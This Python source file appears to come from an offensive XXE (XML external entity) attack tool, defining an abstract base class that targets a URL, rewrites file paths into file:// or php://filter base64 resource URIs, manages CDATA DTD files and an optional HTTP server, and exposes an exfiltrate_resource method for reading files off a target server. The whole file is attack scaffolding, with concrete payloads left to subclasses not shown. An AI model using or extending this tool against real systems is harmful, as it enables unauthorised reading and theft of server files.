from abc import ABC
from abc import abstractmethod
from pathlib import Path
from typing import Optional

from xeely.custom_http.server import HTTPServerParams
from xeely.custom_xml.xml import XML
from xeely.xxe import cdata
from xeely.xxe import decoding


class BaseXXEAttack(ABC):
    def __init__(
        self,
        target_url: str,
        xml: XML,
        encode_data_with_base64: bool,
        use_cdata_tag: bool,
        http_server_params: Optional[HTTPServerParams],
    ):
        self._target_url = target_url
        self._xml = xml
        self._encode_data_with_base64 = encode_data_with_base64
        self._use_cdata_tag = use_cdata_tag
        self._http_server_params = http_server_params

    def get_target_url(self):
        return self._target_url

    def get_xml(self):
        return self._xml

    def get_http_server_params(self) -> Optional[HTTPServerParams]:
        return self._http_server_params

    def get_use_cdata_tag(self):
        return self._use_cdata_tag

    def set_use_cdata_tag(self, value: bool):
        self._use_cdata_tag = value

    def get_encode_data_with_base64(self):
        return self._encode_data_with_base64

    def set_encode_data_with_base64(self, value: bool):
        self._encode_data_with_base64 = value

    def _update_resource(self, resource_path: Path) -> str:
        if self._encode_data_with_base64:
            return f"php://filter/convert.base64-encode/resource={resource_path}"
        else:
            return f"file://{resource_path}"

    @abstractmethod
    def _configure_xml_for_attack(self, resource: str):
        raise NotImplementedError()

    @abstractmethod
    def _run_attack(self) -> str:
        raise NotImplementedError()

    def _decode_data(self, data: str) -> str:
        if self._encode_data_with_base64:
            return decoding.decode_data_containing_base64_content(data)
        return data

    def exfiltrate_resource(self, resource_path: Path) -> str:
        resource = self._update_resource(resource_path)
        self._configure_xml_for_attack(resource)

        if self._use_cdata_tag:
            cdata.create_cdata_dtd_file()

        data = self._decode_data(self._run_attack())

        if self._use_cdata_tag:
            cdata.delete_cdata_dtd_file()

        return data
